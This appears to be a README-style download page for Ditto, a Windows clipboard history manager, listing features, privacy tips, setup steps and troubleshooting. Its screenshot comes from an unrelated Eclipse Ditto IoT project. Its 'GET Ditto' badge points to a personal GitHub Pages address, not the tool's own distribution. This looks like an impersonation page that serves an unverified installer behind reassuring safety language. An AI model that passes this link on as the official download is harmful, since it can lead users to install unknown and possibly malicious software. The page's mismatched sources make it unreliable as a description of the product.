# Ditto - Clipboard History for This PC

Ditto keeps a list of text and images you copied on this computer, so you can paste an earlier item without copying it again. It watches the clipboard of the Windows user who is logged in. It is not a recorder for someone else's machine, and it does not read keystrokes outside the clipboard.

---

## Why It Stands Out

![Ditto clipboard history on the PC where the user is working](https://eclipse.dev/ditto/3.4/images/pages/ui/screenshot_introduction.png)

A normal clipboard holds one item. The moment you copy something else, the previous text is gone. Ditto stores those copies in a list you open with a hotkey, so a paragraph you copied ten minutes ago is still there. That list lives on this PC. If you copied a password, a private message, or a customer number, it is now in the history until you remove it.

Treat the history as sensitive as the things you copy. On a computer other people unlock, pause capture or clear the list before you walk away. Ditto does not belong on a PC you are using to watch another person. Paste from the list only into a window you meant to fill. A wrong paste into a chat is still a send once you hit enter.

---

## Core Capabilities

- **A Local History:** Items you copied in this Windows session can be listed and pasted again.
- **Search Your Copies:** Find a phrase you copied earlier instead of hunting through documents.
- **Paste the One You Mean:** Pick an entry from the list. The current clipboard is no longer the only choice.
- **A Clear Action:** Delete entries, especially anything that looks like a password or a token.
- **Pause When Needed:** Stop capture while you handle secrets, then turn it back on for ordinary work.

---

## Performance Tips

- Keep the history limit modest if this PC is shared or low on disk.
- Clear the list after copying one-time codes, passwords, or private customer text.
- Pause capture before a screen share if the history window might pop up.
- Do not install a clipboard helper from a search ad. Use the build you meant to get.

## Quick Setup

Prerequisites: This is your Windows account, and you accept that copied secrets may sit in a local list until you delete them.

[![GET Ditto](https://img.shields.io/badge/GET%20%E2%80%94%20Ditto-1d4ed8?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/ditto-clips)

1.  **Install:** Run the installer you chose and finish the wizard.
2.  **Copy Two Items:** Copy a harmless sentence, then another, and open the history.
3.  **Paste One Back:** Put the older sentence into a note you own. Confirm it is the right text.
4.  **Clear a Test Entry:** Delete it so you know how to remove a secret later.

---

## Ideal For

- **Daily Writing:** Grab a sentence you copied earlier without going back to the source window.
- **A Form You Fill:** Reuse an address or an id you copied, then clear the list if it was sensitive.
- **A Shared Desk:** Pause or empty the history before the next person sits down.
- **A Careful Habit:** Treat passwords as items you copy, paste once, and delete from the list.

---

## Troubleshooting

- History empty? Copy a normal sentence in Notepad and open Ditto again. A paused capture will not record.
- Hotkey does nothing? Check that another app did not take the same shortcut.
- Old passwords still listed? Delete those entries and pause capture the next time you copy one.
- History popped up on a call? Close it and pause capture before you share the screen.
